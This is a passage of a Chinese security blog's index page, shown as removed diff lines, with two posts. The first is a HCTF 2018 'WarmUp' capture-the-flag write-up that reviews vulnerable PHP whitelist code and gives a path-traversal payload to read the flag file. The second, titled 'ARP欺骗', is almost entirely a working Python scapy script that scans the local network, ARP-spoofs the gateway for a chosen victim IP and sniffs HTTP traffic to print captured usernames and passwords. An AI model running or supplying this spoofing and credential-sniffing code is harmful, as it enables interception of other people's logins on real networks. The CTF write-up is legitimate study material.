-<p>![ACTF2020 新生赛2](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛2.jpg)</p>
-<p>![ACTF2020 新生赛3](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛3.jpg)</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-HCTF 2018 WarmUp" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/HCTF%202018%20WarmUp/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/HCTF%202018%20WarmUp/">
-        HCTF 2018 WarmUp
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h1><p>通过查看页面源码可以看见source.php文件的提示<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf1.jpg" alt="htcf1"></p>
-<p>通过构造/source.php获取源码，并又得到一个文件名hint.php，然后通过构造/hint.php获取一个页面，可见flag在ffffllllaaaagggg文件中<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf2.jpg" alt="hctf2"></p>
-<p>然后审计代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; #创建白名单</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125; #判断$page是否为空，若为不为空，则是false</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125; #查看白名单中是否有$page变量里的东西，有则是true</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            ); #截取问号前的字符串，给$_page</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;#查看白名单中是否有$_page变量里的东西，有则是true</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page); #对$page进行url解码</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );#截取$_page中问好前的东西，在赋给$_page</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125; #查看白名单中是否有$_page变量里的东西，有则是true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    )#判断输入变量是否为空，将其转换为字符串，调用类emmm的方法checkFile()方法是否返回true</span><br><span class="line"> &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;]; #运行目录下的文件</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>通过上面的代码审计，可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>最后得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/hctf3.jpg" alt="hctf3"></p>
-<p>注意：../是跳转到上级目录的意思</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-Arp" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/Arp/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/Arp/">
-        ARP欺骗
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><p>代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import re </span><br><span class="line">import os</span><br><span class="line">from scapy.all import *</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">#定义变量函数</span><br><span class="line">wifi = &#x27;Intel(R) Dual Band Wireless-AC 7265&#x27;</span><br><span class="line">rtable = os.popen(&#x27;route print&#x27;).read()</span><br><span class="line">#print(rtable)</span><br><span class="line">#注意将列表转为字符串</span><br><span class="line">getway = re.findall(r&#x27;0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s&#x27;,rtable)[0]</span><br><span class="line">#print(getway)</span><br><span class="line"></span><br><span class="line">#局域网扫描</span><br><span class="line">def scan():</span><br><span class="line"></span><br><span class="line">#SR()函数用来来发送数据包和接收响应，他会返回两个列表数据，一个是answer list 另一个是unanswered list</span><br><span class="line">#公式：pack=Ether(src=攻击者MAC地址,dst=目标MAC地址)/ARP(hwsrc=攻击者MAC地址,psrc=要假装谁就是谁的IP地址,hwdst=目标MAC地址,pdst=目标IP地址,op=2)</span><br><span class="line">    ans,unans = srp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=getway+&#x27;/24&#x27;),timeout=1)</span><br><span class="line">    print(&#x27;一共扫描到%d个主机：&#x27;%len(ans))</span><br><span class="line">    for i in ans:</span><br><span class="line">        print(i)</span><br><span class="line"> </span><br><span class="line">#找用户名和密码</span><br><span class="line">def paw(p):</span><br><span class="line">    try:</span><br><span class="line">        if p.haslayer(Raw):</span><br><span class="line">            ss=p.load.decode()</span><br><span class="line">            result=re.findall(r&#x27;userName=(.+)&amp;passWord=(.+)&#x27;,ss)</span><br><span class="line">            if result:</span><br><span class="line">                print(&#x27;user:&#x27;,result[0][0])</span><br><span class="line">                print(&#x27;pass:&#x27;,result[0][1])</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">      </span><br><span class="line">#抓包</span><br><span class="line">def capture(tip,tcap):</span><br><span class="line">    #冒充自己为网关</span><br><span class="line">    pkts=sniff(iface=wifi,timeout=tcap,filter=&#x27;tcp port 80 and src host %s&#x27;%tip,prn=paw)</span><br><span class="line">        </span><br><span class="line">#arp欺骗攻击</span><br><span class="line">def arpspoof(tip,tcap):</span><br><span class="line">    t = Thread(target=capture,args=(tip,tcap))</span><br><span class="line">    t.start()</span><br><span class="line">    for i in range(tcap*5):</span><br><span class="line">        sendp(Ether(dst=&#x27;ff:ff:ff:ff:ff:ff&#x27;)/ARP(pdst=target,psrc=getway))</span><br><span class="line">        time.sleep(0.2)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    scan()</span><br><span class="line">    target = input(&#x27;输入要攻击的ip地址：&#x27;).strip()</span><br><span class="line">    tl = int(input(&#x27;输入要准备攻击的时间：&#x27;).strip())</span><br><span class="line">    arpspoof(target,tl)</span><br><span class="line">    print(&#x27;攻击结束！&#x27;)</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
 	</div>
 
       
